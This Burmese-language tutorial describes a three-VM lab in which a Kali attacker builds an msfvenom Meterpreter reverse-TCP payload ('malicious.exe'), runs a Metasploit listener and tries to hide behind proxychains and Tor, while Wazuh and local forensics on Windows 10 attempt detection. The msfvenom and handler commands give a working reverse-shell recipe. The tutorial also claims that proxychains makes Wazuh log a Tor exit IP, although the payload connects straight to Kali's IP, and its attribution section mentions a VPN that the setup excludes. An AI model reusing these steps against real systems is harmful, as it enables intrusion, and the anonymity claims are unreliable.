# Penetration Testing (Pen Test)** နဲ့ **Blue Team Defense (ကာကွယ်ရေး)

 ဒီ Setup ဟာ **Cyber Security** ပညာရပ်မှာ အလွန်အရေးပါတဲ့ **Attacker Anonymity (အမည်မဖော်လိုခြင်း)** နဲ့ **Detection (ဖမ်းမိခြင်း)**


## Lab Setup: Anonymity and Detection (၅) ဆင့်

ဒီ Lab Setup မှာ အဓိကအားဖြင့် **VM (Virtual Machine)** (၃) ခု ပါဝင်ပါမယ်။

  * **Attacker VM:** Kali Linux (Proxychains, Msfvenom)
  * **Target/Victim VM:** Windows 10 (Payload ကို လက်ခံမည့် စက်)
  * **Monitoring/SIEM VM:** Linux Server (Wazuh Manager/Server)

**မှတ်ချက်:** ရိုးရှင်းစေရန်အတွက်၊ **VPN** ကိုတော့ ဒီအဆင့်တွေမှာ ထည့်သွင်းစဉ်းစားခြင်း မရှိသေးပါဘူး။ **Tor Network** ကိုသာ **Proxy** အဖြစ် အသုံးပြုပါမယ်။

### အဆင့် ၁: Infrastructure ဖွဲ့စည်းပုံနှင့် VM Setup

1.  **VM Setup:** VirtualBox သို့မဟုတ် VMware ကို သုံးပြီး အောက်ပါ VM များကို Install လုပ်ပါ။
      * **Kali Linux:** Attacker (IP: ဥပမာ- 192.168.x.10)
      * **Windows 10:** Victim (IP: ဥပမာ- 192.168.x.20)
      * **Wazuh Server:** Monitoring (IP: ဥပမာ- 192.168.x.30)
2.  **Network Configuration:** VM (၃) ခုလုံးကို **Host-only** သို့မဟုတ် **NAT Network** (Internet Access ရရန်) ဖြင့် ချိတ်ဆက်ပြီး၊ IP Address တွေ တစ်ခုနဲ့တစ်ခု မြင်ရဖို့ သေချာပါစေ။
3.  **Wazuh Agent Install:** **Windows 10 VM** မှာ **Wazuh Agent** ကို Install လုပ်ပြီး **Wazuh Server** ဆီကို Log တွေ ပို့နေဖို့ သေချာအောင် စစ်ဆေးပါ။ (Wazuh Manager ရဲ့ Dashboard မှာ Windows 10 Agent ကို မြင်နေရရပါမယ်)။

### အဆင့် ၂: Proxychains အတွက် TOR Setup

Attacker VM (Kali Linux) မှာ Proxy Server အဖြစ် **Tor Network** ကို သုံးပါမယ်။

1.  **Tor Install:** Kali မှာ Tor ကို Install လုပ်ပြီး Run ပါ။
    $$\text{sudo apt update}$$
    $$\text{sudo apt install tor}$$
    $$\text{sudo service tor start}$$

2.  **Proxychains Configuration:** `/etc/proxychains.conf` ဖိုင်ကို ဖွင့်ပါ။
    $$\text{sudo nano /etc/proxychains.conf}$$

3.  **ပြင်ဆင်မှုများ:**

      * `# dynamic_chain` ရဲ့ ရှေ့က `#` ကို ဖယ်ပါ။
      * ဖိုင်ရဲ့ အောက်ဆုံး `[ProxyList]` အပိုင်းကို သွားပါ။
      * **ရှိပြီးသား Proxy တွေကို Comment (\#) လုပ်** ပြီး၊ Tor ရဲ့ Default Proxy ကို ထည့်သွင်းပါ။

    <!-- end list -->

    ```
    [ProxyList]
    # socks4 127.0.0.1 9050 # ဒါကို ဖယ်/Comment လုပ်
    # ဒါကို ထည့်ပါ
    socks5 127.0.0.1 9050
    ```

### အဆင့် ၃: Payload ဖန်တီးခြင်း (Msfvenom)

Kali VM မှာ **Reverse TCP Payload** ကို ဖန်တီးပါမယ်။

1.  **LHOST/LPORT သတ်မှတ်ခြင်း:** Payload က Victim စက်ကနေ **Attacker VM Kali (LHOST)** ဆီကို **LPORT** (ဥပမာ- 4444) ကနေ ပြန်ချိတ်ဆက်ဖို့ ရည်ရွယ်ပါတယ်။

    > **LHOST နေရာမှာ Kali ရဲ့ Local IP (ဥပမာ- 192.168.x.10) ကိုသာ ထည့်ပါ**၊ Proxy ရဲ့ IP ကို မထည့်ပါနှင့်။

    $$\text{msfvenom -p windows/meterpreter/reverse\_tcp LHOST=192.168.x.10 LPORT=4444 -f exe > /tmp/malicious.exe}$$

### အဆင့် ၄: Attacker Side မှာ Listener ဖွင့်ခြင်း (Metasploit)

Kali VM မှာ Payload က ပြန်ချိတ်ဆက်လာတာကို နားထောင်ဖို့ Listener ကို ဖွင့်ပါမယ်။

1.  **Metasploit Console ဖွင့်:**
    $$\text{msfconsole}$$
2.  **Listener  Setup:**
    ```
    use exploit/multi/handler
    set payload windows/meterpreter/reverse_tcp
    set LHOST 192.168.x.10  # Kali ရဲ့ IP
    set LPORT 4444         # Payload မှာ သတ်မှတ်ထားတဲ့ Port
    exploit
    ```

### အဆင့် ၅: Payload ကို Proxy ဖြတ်ပြီး ပို့ခြင်းနှင့် စမ်းသပ်ခြင်း

အခုမှ **`proxychains`** ကို စတင် အသုံးပြုပါမယ်။

1.  **Proxy ဖြတ်ပြီး Payload ပို့ခြင်း (Transfer):**
    Payload File (`malicious.exe`) ကို Windows 10 ဆီကို Proxy ဖြတ်ပြီး ပို့ဖို့အတွက် **`proxychains`** နဲ့ **Web Server** တစ်ခုကို ယာယီ ဖွင့်လိုက်ပါမယ် (ဥပမာ- Python ကိုသုံးပြီး)။

    $$\text{proxychains python3 -m http.server 80}$$

2.  **Victim (Windows 10) က ယူခြင်း:** Windows 10 VM မှာ Browser ကိုဖွင့်ပြီး **Proxy Server ရဲ့ IP** (Tor ကို ဖြတ်တဲ့အတွက် Tor ရဲ့ ထွက်ပေါက် IP) ကနေ **Download** လုပ်ရပါမယ်။ (ဒီအပိုင်းက နည်းနည်းရှုပ်ထွေးနိုင်လို့ Payload ကို USB/Shared Folder ကနေ ပို့လိုက်ပြီး **Execution** ကိုသာ စမ်းသပ်တာ ပိုရိုးရှင်းပါတယ်)။

3.  **Execution (အဓိက စမ်းသပ်ချက်):**

      * Payload ကို Windows 10 မှာ Run လိုက်ပါ။
      * Kali ရဲ့ Metasploit မှာ **Meterpreter Session** ဝင်လာတာကို တွေ့ရပါမယ်။

4.  **Detection (Wazuh) ကို စစ်ဆေးခြင်း:**

      * Wazuh Server ရဲ့ Dashboard ကို သွားပါ။
      * **Windows 10 Agent** ရဲ့ Log တွေကို စစ်ဆေးပါ။
      * Wazuh က **Meterpreter Connection (Reverse Shell)** ကို ဖမ်းမိပေမယ့်၊ **Source IP (Attack Origin)** အနေနဲ့ **Proxy Server ရဲ့ IP** ကိုသာ ဖော်ပြနေတာကို တွေ့ရပါလိမ့်မယ်။


ဒီအဆင့်တွေနဲ့ စမ်းသပ်ခြင်းအားဖြင့် `proxychains` ဟာ **IP-level Tracking** ကို ဘယ်လို ဖုံးကွယ်သွားတယ်ဆိုတာကို လက်တွေ့ မြင်တွေ့နိုင်မှာ ဖြစ်ပါတယ်။
---

# Attacker Perspective (Red Team) နဲ့ Blue Team (Defender) 

ဒီ Process ဟာ **Post-Exploitation (တိုက်ခိုက်မှု အောင်မြင်ပြီးနောက်)** မှာ **Evidence (သက်သေ) တွေကို ခြေရာခံခြင်း** ကို နားလည်စေဖို့ ရည်ရွယ်ပါတယ်။

---

## Attacker (Red Team) နှင့် Defender (Blue Team) Tools များ အဆင့်ဆင့် ရှင်းလင်းချက်

ဒီ Scenario မှာ **Kali Linux (Attacker)**၊ **Windows 10 (Victim)**၊ နဲ့ **Wazuh (SIEM/Monitoring)** တို့ ပါဝင်ပါတယ်။

### အဆင့် ၁: ⚙️ Attacker Setup & Anonymity (Red Team)

| လုပ်ဆောင်ချက် | Tool | ရှင်းလင်းချက် |
| :--- | :--- | :--- |
| **Proxy Tool ထည့်သွင်း** | **`proxychains`** | Network Traffic ကို ဖုံးကွယ်ရန် Install လုပ်သည်။ |
| **Anonymity Layer ဖွဲ့စည်း** | **`Tor`** | Traffic ကို လှည့်ပတ်စီးဆင်းစေပြီး ခြေရာခံရန် ခက်ခဲစေရန်။ |
| **Proxy Conf. ပြင်ဆင်** | **`nano /etc/proxychains.conf`** | Tor (socks5 127.0.0.1 9050) ကို Proxy Chain အဖြစ် သတ်မှတ်သည်။ |

### အဆင့် ၂: Payload ဖန်တီးခြင်း (Red Team)

| လုပ်ဆောင်ချက် | Tool | ရှင်းလင်းချက် |
| :--- | :--- | :--- |
| **Payload Creation** | **`msfvenom`** | **Reverse Shell Payload** (ဥပမာ- `malicious.exe`) ကို ဖန်တီးသည်။ |
| **Listener Setup** | **`msfconsole`** | Payload က ပြန်ချိတ်ဆက်လာမည့် Connection ကို နားထောင်ရန် **Handler** (Reverse TCP) ကို စောင့်နေစေသည်။ (LHOST တွင် Kali IP ကို သုံးသည်)။ |

### အဆင့် ၃: Payload ပို့ခြင်းနှင့် Execution (Red Team)

| လုပ်ဆောင်ချက် | Tool | ရှင်းလင်းချက် |
| :--- | :--- | :--- |
| **Payload Transfer** | **`proxychains python3 -m http.server`** | Python ကိုသုံးပြီး Payload ဖိုင်ကို Proxy Chain ဖြတ်၍ Web Server အဖြစ် ယာယီ ထုတ်လွှင့်သည်။ |
| **Victim Access** | **(Browser/`wget`)** | Victim (Win10) က Proxy Server ရဲ့ IP မှတစ်ဆင့် Payload ကို Download လုပ်သည်။ |
| **Execution** | **(User Clicks)** | Victim စက်တွင် `malicious.exe` ကို Run လိုက်သည်။ |
| **Result** | **`msfconsole`** | Attacker ၏ Metasploit တွင် **Meterpreter Session** အောင်မြင်စွာ ရရှိသည်။ |

---

### အဆင့် ၄: Monitoring/Detection (Blue Team - Wazuh)

| လုပ်ဆောင်ချက် | Tool | ရှင်းလင်းချက် |
| :--- | :--- | :--- |
| **Traffic Log Analysis** | **`Wazuh Manager Dashboard`** | Wazuh Dashboard မှာ **Network Connection Log** များကို စစ်ဆေးသည်။ |
| **တွေ့ရှိချက်** | **(Log Found)** | Meterpreter Connection (Reverse Shell) သည် အောင်မြင်ကြောင်း Log တွေ့ရသည်။ |
| **Source IP စစ်ဆေးခြင်း** | **(Wazuh Logs)** | Log ထဲတွင် **Source IP** နေရာ၌ Kali ရဲ့ မူရင်း IP (192.168.x.10) ကို မတွေ့ဘဲ၊ **Proxy Server ရဲ့ IP** (ဥပမာ- Tor Exit Node) ကိုသာ တွေ့နေရခြင်း။ |
| **နိဂုံးချုပ်** | **IP Anonymity** | **`proxychains`** ကြောင့် IP-based ခြေရာခံခြင်း အောင်မြင်စွာ ဖုံးကွယ်သွားကြောင်း သိရသည်။ |

---

### အဆင့် ၅: Victim စက်ထဲ ဝင်ရောက် စစ်ဆေးခြင်း (Blue Team - Forensics)

Wazuh မှာ Source IP ကို မတွေ့တော့တဲ့အခါ၊ Blue Team ဟာ **Victim စက် (Windows 10)** ကို **"Local Forensics (ဒေသတွင်း စုံစမ်းစစ်ဆေးမှု)"** ဖြင့် စတင် စစ်ဆေးရပါတော့မယ်။

| လုပ်ဆောင်ချက် | Tool | ရှင်းလင်းချက် |
| :--- | :--- | :--- |
| **Process ရှင်းလင်းမှု** | **`Task Manager`** သို့မဟုတ် **`Sysinternals Process Explorer`** | ပုံမှန်မဟုတ်တဲ့ **Process** (ဥပမာ- `malicious.exe` သို့မဟုတ် ပုံမှန်မဟုတ်တဲ့ Parent Process ရှိသော `explorer.exe` process) ကို ရှာဖွေသည်။ |
| **Network Connection စစ်ဆေးမှု** | **`netstat`** (Windows CMD) | **`netstat -ano`** ကိုသုံးပြီး **Establish ဖြစ်နေတဲ့ TCP Connection** များကို စစ်သည်။ Source/Foreign Address မှာ **Attacker ရဲ့ Listen Port (4444)** ကို ချိတ်ဆက်ထားတဲ့ Connection ကို တွေ့ရနိုင်သည်။ |
| **File Artifacts စစ်ဆေးမှု** | **`Windows Event Viewer`** / **File System** | `malicious.exe` ကို Download လုပ်တဲ့ **Browser History**၊ ဖိုင်ကို စတင် Run ခဲ့တဲ့အချိန် (Execution Time)၊ နဲ့ Temp Folder ထဲမှာ ကျန်ခဲ့တဲ့ **Artifacts** တွေကို ရှာဖွေသည်။ |

### အဆင့် ၆: ခြေရာခံခြင်း (Blue Team - Attribution)

Local Forensics ကနေ ရလာတဲ့ အချက်အလက် (ဥပမာ- Proxy IP၊ Connection Time) တွေကို အခြေခံပြီး၊ ပုံမှန်မဟုတ်တဲ့ Network Traffic ကို စစ်ထုတ်ဖို့ လိုအပ်ပါတယ်။

| လုပ်ဆောင်ချက် | Tool | ရှင်းလင်းချက် |
| :--- | :--- | :--- |
| **Traffic Filtering** | **`Wazuh Rules`** သို့မဟုတ် **`IDS (Intrusion Detection System)`** | **Proxy IP** မှ လာတဲ့ Traffic (သို့မဟုတ်) **Port 4444** လိုမျိုး High-Risk Port တွေကို သီးသန့် Rule များ ရေးပြီး ရှာဖွေဖမ်းယူသည်။ |
| **Proxy Log တောင်းဆိုခြင်း** | **(Legal/Admin)** | Proxy Server (ဥပမာ- Tor Exit Node) ကို ပိုင်ဆိုင်သူဆီကနေ **Log Files** များကို တောင်းယူပြီး၊ **VPN ရဲ့ IP** အထိ ပြန်လည် ခြေရာခံဖို့ ကြိုးစားသည်။ |
